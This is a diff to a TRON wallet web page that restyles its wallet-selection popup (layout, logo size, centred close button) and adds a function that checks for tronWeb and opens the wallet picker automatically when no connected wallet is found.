@@ -493,7 +493,7 @@
     cursor: pointer;
 }
 
-/* 新增：多钱包选择弹窗样式 */
+/* 新增：多钱包选择弹窗样式（修改后：横向排列+名称在logo下方+关闭按钮居中） */
 .wallet-modal {
     position: fixed;
     top: 0;
@@ -503,9 +503,9 @@
     background: rgba(0,0,0,0.7);
     z-index: 9999;
     display: none;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
+    align-items: flex-start; /* 垂直方向靠上对齐，配合padding-top往下移 */
+    justify-content: center; /* 横向仍居中 */
+    padding: 80px 20px 20px; /* 顶部留80px间距（往下移），左右20px，底部20px */
 }
 .wallet-modal.active {
     display: flex;
@@ -514,8 +514,10 @@
     background: #1e2925;
     border-radius: 12px;
     width: 100%;
-    max-width: 400px;
+    max-width: 500px; /* 适当加宽，适配横向排列 */
     border: 1px solid #3b82f6;
+    display: flex;
+    flex-direction: column; /* 纵向排列：标题→钱包列表→关闭按钮 */
 }
 .wallet-modal-header {
     padding: 16px;
@@ -527,37 +529,51 @@
     font-size: 18px;
     font-weight: 600;
 }
+/* 核心修改：钱包列表横向排列，支持换行 */
 .wallet-list {
-    padding: 12px 0;
+    padding: 20px 16px;
+    display: flex;
+    justify-content: center; /* 横向居中 */
+    align-items: center; /* 纵向居中 */
+    gap: 20px; /* 钱包之间的间距 */
+    flex-wrap: wrap; /* 超出宽度自动换行 */
+    flex: 1; /* 占满中间空间，让关闭按钮靠底 */
 }
+/* 核心修改：钱包项纵向排列（logo在上，名称在下） */
 .wallet-item {
     display: flex;
-    align-items: center;
-    padding: 12px 20px;
+    flex-direction: column; /* 纵向排列：logo→名称 */
+    align-items: center; /* 横向居中 */
+    justify-content: center;
+    padding: 12px;
     cursor: pointer;
     transition: background 0.3s;
+    border-radius: 8px; /* 增加圆角，hover更美观 */
+    width: 80px; /* 固定宽度，避免错位 */
 }
 .wallet-item:hover {
     background: rgba(59, 130, 246, 0.1);
 }
 .wallet-item img {
-    width: 36px;
-    height: 36px;
+    width: 48px; /* 适当加大logo */
+    height: 48px;
     border-radius: 8px;
-    margin-right: 12px;
+    margin-right: 0; /* 取消右侧间距（名称在下方） */
+    margin-bottom: 8px; /* logo与名称的间距 */
 }
-.wallet-item-info {
-    flex: 1;
-}
-.wallet-item-name {
+/* 钱包名称样式调整 */
+.wallet-name {
     color: #e0e8e4;
-    font-size: 15px;
+    font-size: 14px;
     font-weight: 500;
+    text-align: center; /* 名称居中 */
 }
-.wallet-item-desc {
-    color: #a0a8a4;
-    font-size: 12px;
-    margin-top: 2px;
+/* 核心修改：关闭按钮容器（居中+底部） */
+.wallet-modal-footer {
+    padding: 16px;
+    border-top: 1px solid #334155;
+    display: flex;
+    justify-content: center; /* 按钮横向居中 */
 }
 #closeMultiWalletBtn {
     padding: 8px 24px;
@@ -666,10 +682,12 @@
          </div>
     </div>
     <div class="wallet-modal" id="multiWalletPopup">
-        <div class="wallet-modal-content">
-            <div class="wallet-modal-header">
-                <div class="wallet-modal-title">选择你的钱包</div>
-            </div>
+    <div class="wallet-modal-content">
+        <!-- 弹窗标题 -->
+        <div class="wallet-modal-header">
+            <div class="wallet-modal-title">选择你的钱包</div>
+        </div>
+        <!-- 钱包列表（横向排列） -->
         <div class="wallet-list">
             <div class="wallet-item" data-wallet="imtoken">
                 <img src="./icon/imToken.png" alt="imToken Logo" class="wallet-logo">
@@ -688,9 +706,12 @@
                 <span class="wallet-name">Bitget Wallet</span>
             </div>
         </div>
-       <button id="closeMultiWalletBtn">关闭</button>
+        <!-- 关闭按钮（底部中间） -->
+        <div class="wallet-modal-footer">
+            <button id="closeMultiWalletBtn">关闭</button>
+        </div>
     </div>
-</div> 
+</div>
     <div id="userInfo">
         <span id="userInfoDefault">未连接钱包<br>
         <span>请点击底部「连接钱包」按钮</span></span>
@@ -1555,6 +1576,30 @@ async function queryUserEnergyBalance(address) {
                 alert(lang.authorizeFail.replace("{msg}", errMsg || "签名取消或网络异常"));
             }
         };
+    }
+        /**
+     * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
+     * 检测钱包环境（TRON兼容钱包）
+     */
+    async function checkWalletEnv() {
+        // 检测到本地tronWeb（已连接钱包）
+        if (window.tronWeb && window.tronWeb.ready) {
+            tronWeb = window.tronWeb;
+            DOM.connectBtn.style.display = "none"; // 隐藏连接按钮
+            DOM.warning.style.display = "none";
+            DOM.specialTipContainer.style.display = "none";
+            await initWallet(false);
+            return;
+        }
+
+        // 修复3：未检测到tronWeb时，直接显示选择钱包弹窗（无需点击连接按钮）
+        DOM.specialTipContainer.style.display = "block";
+        DOM.userInfoDefault.style.display = "none";
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = "请选择要连接的钱包";
+        DOM.approveBtn.style.display = "none";
+       
+        DOM.multiWalletPopup.style.display = "block"; // 直接显示选择钱包弹窗
     }
 
 /**
